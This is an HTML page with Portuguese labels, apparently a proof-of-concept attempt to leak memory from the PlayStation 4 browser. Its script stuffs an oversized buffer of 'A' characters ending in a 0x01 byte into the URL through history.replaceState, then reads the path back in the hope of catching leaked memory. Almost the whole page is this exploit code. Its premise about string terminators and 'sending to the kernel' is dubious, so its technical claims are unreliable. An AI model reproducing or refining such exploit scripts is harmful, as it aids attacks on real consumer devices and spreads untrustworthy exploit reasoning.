<!DOCTYPE html>
<html>
<head>
    <title>PS4 Memory Leak PoC</title>
    <style>
        body { background-color: #000033; color: #00ffff; font-family: monospace; padding: 20px; word-wrap: break-word;}
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: 2px solid #00ffff; background: #000; color: #fff;
        }
        #result { border: 1px solid #444; padding: 10px; min-height: 100px; color: yellow; font-size: 14px; }
        .highlight { color: #ff00ff; font-weight: bold; background: #fff; }
    </style>
</head>
<body>

    <h1>Tentativa de Vazamento de Memória</h1>
    <p>Substituindo NULL (0x00) por SOH (0x01) para estourar a leitura.</p>

    <button onclick="huntLeak()">DISPARAR E LER</button>

    <h3>Resultado da Leitura:</h3>
    <div id="result">Aguardando...</div>

    <script>
        const OFFSET = 709522;

        function huntLeak() {
            const resDiv = document.getElementById('result');
            resDiv.innerText = "Injetando payload...";

            setTimeout(() => {
                try {
                    // 1. Cria o Buffer Gigante
                    let buffer = "A".repeat(OFFSET);
                    
                    // 2. O TRUQUE: Adiciona 0x01 no final.
                    // Isso remove o "freio" da string. O sistema vai continuar lendo?
                    buffer += "\x01"; 

                    // 3. Envia para o Kernel
                    // Usamos replaceState para tentar modificar a entrada atual
                    const stateObj = { id: "leak_attempt" };
                    history.replaceState(stateObj, "leak", "/" + buffer);

                    // 4. Tenta ler de volta IMEDIATAMENTE
                    // Se o vazamento funcionar, location.pathname ou history.state 
                    // podem conter lixo de memória após os nossos "A"s.
                    
                    const readBack = window.location.pathname; // ou decodificar a URL
                    const len = readBack.length;
                    
                    // O tamanho esperado é OFFSET + 1 (A barra) + 1 (O byte 1) = OFFSET + 2
                    // Se for maior que isso, vazamos dados!
                    
                    if (len > (OFFSET + 50)) { // Margem de segurança
                        resDiv.innerHTML = "<span class='highlight'>SUCESSO! VAZAMENTO DETECTADO!</span><br>";
                        resDiv.innerHTML += "Tamanho lido: " + len + " bytes.<br>";
                        
                        // Pega os últimos caracteres (o lixo)
                        const leakData = readBack.substring(OFFSET); 
                        resDiv.innerText += "DADOS VAZADOS: " + leakData;
                        
                    } else {
                        resDiv.innerText = "Falha. Tamanho retornado: " + len + ". O sistema truncou a string.";
                    }

                } catch (e) {
                    resDiv.innerText = "Erro (O navegador pode ter crashado ou bloqueado): " + e.message;
                }
            }, 500);
        }
    </script>
</body>
</html>
